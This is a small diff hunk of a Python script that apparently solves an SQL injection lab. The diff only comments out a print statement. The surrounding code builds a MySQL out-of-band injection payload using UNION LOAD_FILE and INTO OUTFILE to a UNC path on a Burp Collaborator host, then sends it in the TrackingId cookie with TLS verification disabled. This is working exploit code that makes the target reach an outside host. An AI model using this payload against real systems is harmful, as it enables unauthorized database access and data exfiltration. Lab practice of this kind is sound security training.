@@ -97,7 +97,7 @@ def mysql_check(url,tracking,sid, burp_collaborator):
     sqli_payload_union = f"' UNION LOAD_FILE('\\\\\\\\{burp_collaborator}\\\\a')\
         SELECT ... INTO OUTFILE '\\\\\\\\{burp_collaborator}\\a'-- "
     sqli_payload_union_encoded = urllib.parse.quote(sqli_payload_union)
-    print(sqli_payload_union_encoded)
+    #print(sqli_payload_union_encoded)
     cookies = {'TrackingId': tracking+sqli_payload_union_encoded, 'session': sid}
     #print(cookies)
     r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
